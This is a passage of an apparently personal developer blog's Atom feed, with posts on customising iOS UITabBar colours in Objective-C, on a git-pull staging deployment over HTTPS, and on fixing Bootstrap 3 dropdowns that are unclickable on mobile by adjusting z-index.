class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UIColor</span> *backgroundColor = [<span class="built_in">UIColor</span> greenColor];</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the bar background color</span></span><br><span class="line">[[<span class="built_in">UITabBar</span> appearance] setBackgroundImage:[AppDelegate imageFromColor:backgroundColor forSize:<span class="built_in">CGSizeMake</span>(<span class="number">320</span>, <span class="number">49</span>) withCornerRadius:<span class="number">0</span>]];</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the text color for selected state</span></span><br><span class="line">[[<span class="built_in">UITabBarItem</span> appearance] setTitleTextAttributes:[<span class="built_in">NSDictionary</span> dictionaryWithObjectsAndKeys:[<span class="built_in">UIColor</span> whiteColor], <span class="built_in">UITextAttributeTextColor</span>, <span class="literal">nil</span>] forState:<span class="built_in">UIControlStateSelected</span>];</span><br><span class="line"><span class="comment">// set the text color for unselected state</span></span><br><span class="line">[[<span class="built_in">UITabBarItem</span> appearance] setTitleTextAttributes:[<span class="built_in">NSDictionary</span> dictionaryWithObjectsAndKeys:[<span class="built_in">UIColor</span> whiteColor], <span class="built_in">UITextAttributeTextColor</span>, <span class="literal">nil</span>] forState:<span class="built_in">UIControlStateNormal</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the selected icon color</span></span><br><span class="line">[[<span class="built_in">UITabBar</span> appearance] setTintColor:[<span class="built_in">UIColor</span> whiteColor]];</span><br><span class="line">[[<span class="built_in">UITabBar</span> appearance] setSelectedImageTintColor:[<span class="built_in">UIColor</span> whiteColor]];</span><br><span class="line"><span class="comment">// remove the shadow</span></span><br><span class="line">[[<span class="built_in">UITabBar</span> appearance] setShadowImage:<span class="literal">nil</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the dark color to selected tab (the dimmed background)</span></span><br><span class="line">[[<span class="built_in">UITabBar</span> appearance] setSelectionIndicatorImage:[AppDelegate imageFromColor:[<span class="built_in">UIColor</span> colorWithRed:<span class="number">26</span>/<span class="number">255.0</span> green:<span class="number">163</span>/<span class="number">255.0</span> blue:<span class="number">133</span>/<span class="number">255.0</span> alpha:<span class="number">1</span>] forSize:<span class="built_in">CGSizeMake</span>(<span class="number">64</span>, <span class="number">49</span>) withCornerRadius:<span class="number">0</span>]];</span><br></pre></td></tr></table></figure><p><strong>Remark: Those icon images is in white color</strong></p><p>Until this stage, you will get this,</p><p><img src="/images/posts/2014-05-05-ios-customize-uitabbar-appearance/tabbar-appearance-1.png" alt="Icon color changed"></p><p>by right it should shows white color, but somehow the icon image has changed.</p><p>In order to make it as its original color</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JSSettingsViewController *settingsViewController = [[JSSettingsViewController alloc] init];</span><br><span class="line"><span class="built_in">UINavigationController</span> *settingsNavigationController = [[<span class="built_in">UINavigationController</span> alloc] initWithRootViewController:settingsViewController];</span><br><span class="line"><span class="comment">// LOOK AT THIS</span></span><br><span class="line">settingsNavigationController.tabBarItem.image = [[<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;IconSetting&quot;</span>] imageWithRenderingMode:<span class="built_in">UIImageRenderingModeAlwaysOriginal</span>];</span><br></pre></td></tr></table></figure><p>We have to set the <code>UIImage</code>‘s <code>imageWithRenderingMode</code> to <code>UIImageRenderingModeAlwaysOriginal</code> in order for it to always render original image.</p><p><strong>NOTE: <code>imageWithRenderingMode</code> is only applicable for iOS7</strong></p><p>Done :)</p><p><em>References:</em></p><ul><li><em><a href="https://stackoverflow.com/questions/21596515/to-change-the-color-of-unselected-uitabbar-icon-in-ios-7/21597313#21597313">To change the color of unselected UITabBar icon in iOS 7?</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Final look will be&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/posts/2014-05-05-ios-customize-uitabbar-appearance/tabbar-appearance-2.png&quot; alt=&quot;Desired</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Lazy way for web application staging deployment</title>
    <link href="http://jslim.net/blog/2014/04/29/lazy-way-for-web-application-staging-deployment/"/>
    <id>http://jslim.net/blog/2014/04/29/lazy-way-for-web-application-staging-deployment/</id>
    <published>2014-04-29T05:19:55.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>When comes to deployment, usually what we do is copy modified files over the server. It may takes some time on doing so.</p><p>I’ve discover an easy way to do deployment.</p><p>Example: I have a PHP web app hosted on <a href="https://bitbucket.org/">Bitbucket</a>, let say <a href="https://jslim89@bitbucket.org/myorganization/my-private-app">https://jslim89@bitbucket.org/myorganization/my-private-app.git</a> and this project has 3 developers involved. Now I want to deploy on staging server for client to test.</p><h3 id="SSH-to-the-server"><a href="#SSH-to-the-server" class="headerlink" title="SSH to the server"></a>SSH to the server</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh root<span class="variable">@123</span>.<span class="number">123.123</span>.<span class="number">123</span></span><br></pre></td></tr></table></figure><h3 id="Assumed-the-project-want-to-store-in-var-www-mywebapp-com"><a href="#Assumed-the-project-want-to-store-in-var-www-mywebapp-com" class="headerlink" title="Assumed the project want to store in /var/www/mywebapp.com"></a>Assumed the project want to store in <strong>/var/www/mywebapp.com</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> /var/www/mywebapp.com</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /var/www/mywebapp.com</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git init</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote add jslim89 https://jslim89@bitbucket.org/myorganization/my-private-app.git</span></span><br></pre></td></tr></table></figure><p>The Git URL please <strong>don’t</strong> use <strong>SSH</strong>, use <strong>HTTPS</strong> instead. The reason here is we don’t want to put our private key on server. Besides, there are 3 developers share the same copy.</p><p>The last command here you can see I put my username, you can put whatever you want as long as you can remember. Usually what we see is <code>git remote add origin ....</code>, but in this case different developers may have different URL, e.g. <a href="https://dev1@bitbucket.org/myorganization/my-private-app.git">https://dev1@bitbucket.org/myorganization/my-private-app.git</a>. Thus use <strong>username</strong> rather than <strong>origin</strong></p><h3 id="Update-the-project"><a href="#Update-the-project" class="headerlink" title="Update the project"></a>Update the project</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git pull jslim89 <span class="keyword">master</span></span><br><span class="line"><span class="title"># Then</span> <span class="keyword">type</span> your bitbucket account password, because we are not using private key</span><br></pre></td></tr></table></figure><p><strong>jslim89</strong> here refer to the URL <a href="https://jslim89@bitbucket.org/myorganization/my-private-app.git">https://jslim89@bitbucket.org/myorganization/my-private-app.git</a>, <strong>master</strong> refer to remote master branch</p><h3 id="For-other-developers"><a href="#For-other-developers" class="headerlink" title="For other developers"></a>For other developers</h3><p>They also do the same step with you</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add dev1 https:<span class="regexp">//</span>dev1@bitbucket.org<span class="regexp">/myorganization/my</span>-private-app.git</span><br><span class="line">$ git pull dev1 master</span><br><span class="line"><span class="comment"># type in their own password</span></span><br></pre></td></tr></table></figure><h3 id="Done"><a href="#Done" class="headerlink" title="Done :)"></a>Done :)</h3>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;When comes to deployment, usually what we do is copy modified files over the server. It may takes some time on doing so.&lt;/p&gt;
&lt;p&gt;I’ve</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="deployment" scheme="http://jslim.net/tags/deployment/"/>
    
  </entry>
  
  <entry>
    <title>Bootstrap 3 dropdown menu not showing on mobile browser</title>
    <link href="http://jslim.net/blog/2014/04/28/bootstrap-3-dropdown-menu-not-showing-on-mobile-browser/"/>
    <id>http://jslim.net/blog/2014/04/28/bootstrap-3-dropdown-menu-not-showing-on-mobile-browser/</id>
    <published>2014-04-28T16:46:15.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I believe that most of you had face this kind of problem. <a href="http://getbootstrap.com/components/#btn-dropdowns">Bootstrap 3 dropdown menu</a><br>is clickable on desktop browser, but when comes to mobile, then it has no effect at all.</p><p><strong>index.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main-wrapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;bg-holder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar&quot;</span> <span class="attr">role</span>=<span class="string">&quot;navigation&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-header&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn-navbar-toggle&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;navbar-toggle bg bg-green&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-target</span>=<span class="string">&quot;.navbar-collapse&quot;</span>&gt;</span></span><br><span class="line">                        Menu</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;navbar-brand&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Logo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collapse navbar-collapse bs-navbar-collapse&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/page1.php&quot;</span>&gt;</span>Page 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/page2.php&quot;</span>&gt;</span>Page 2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/page3.php&quot;</span>&gt;</span>Page 3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/page4.php&quot;</span>&gt;</span>Page 4<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--/.nav-collapse --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;pg-1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;container common-wrapper&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12 pole-content-holder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pole left&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pole right&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;pole-heading&quot;</span> <span class="attr">class</span>=<span class="string">&quot;center-div&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">                            Page 1 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/img/icon-pg1.png&quot;</span>/&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!-- Not touchable on mobile --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn-group&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary dropdown-toggle&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;dropdown&quot;</span>&gt;</span></span><br><span class="line">                                    Item 1 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;caret&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-menu&quot;</span> <span class="attr">role</span>=<span class="string">&quot;menu&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html&quot;</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html?item=2&quot;</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html?item=3&quot;</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html?item=4&quot;</span>&gt;</span>Item 4<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    ...</span><br></pre></td></tr></table></figure><p>I’ve googled for hours, even try to modify the <strong>bootstrap.min.js</strong> file, it still doesn’t works.</p><p>Then I try to bind a “click” event on that button</p><p>i.e.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;.dropdown-toggle&#x27;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;dropdown clicked&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>The alert works on desktop, but has no effect on mobile browser.</p><p>Then I try to move the whole chunk of html to the top</p><p>i.e.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main-wrapper&quot;</span>&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!-- Move to here --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn-group&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary dropdown-toggle&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;dropdown&quot;</span>&gt;</span></span><br><span class="line">                                    Item 1 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;caret&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-menu&quot;</span> <span class="attr">role</span>=<span class="string">&quot;menu&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html&quot;</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html?item=2&quot;</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html?item=3&quot;</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html?item=4&quot;</span>&gt;</span>Item 4<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;bg-holder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar&quot;</span> <span class="attr">role</span>=<span class="string">&quot;navigation&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-header&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn-navbar-toggle&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;navbar-toggle bg bg-green&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-target</span>=<span class="string">&quot;.navbar-collapse&quot;</span>&gt;</span></span><br><span class="line">                        Menu</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;navbar-brand&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Logo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collapse navbar-collapse bs-navbar-collapse&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/page1.php&quot;</span>&gt;</span>Page 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/page2.php&quot;</span>&gt;</span>Page 2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/page3.php&quot;</span>&gt;</span>Page 3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;bg bg-green&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/page4.php&quot;</span>&gt;</span>Page 4<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--/.nav-collapse --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;pg-1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;container common-wrapper&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12 pole-content-holder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pole left&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pole right&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;pole-heading&quot;</span> <span class="attr">class</span>=<span class="string">&quot;center-div&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">                            Page 1 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/img/icon-pg1.png&quot;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    ...</span><br></pre></td></tr></table></figure><p>The html above works, then I try move the dropdown menu down to the DOM element level by level.<br>Finally, I found out this might be the view overlapping issue. Then I realize the <code>.navbar</code> <strong>z-index</strong><br>was set to <em>1000</em>. i.e.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.navbar</span> &#123;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1000</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now, I move the dropdown menu to the original place, then change the css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.pole-content-holder</span> &gt; <span 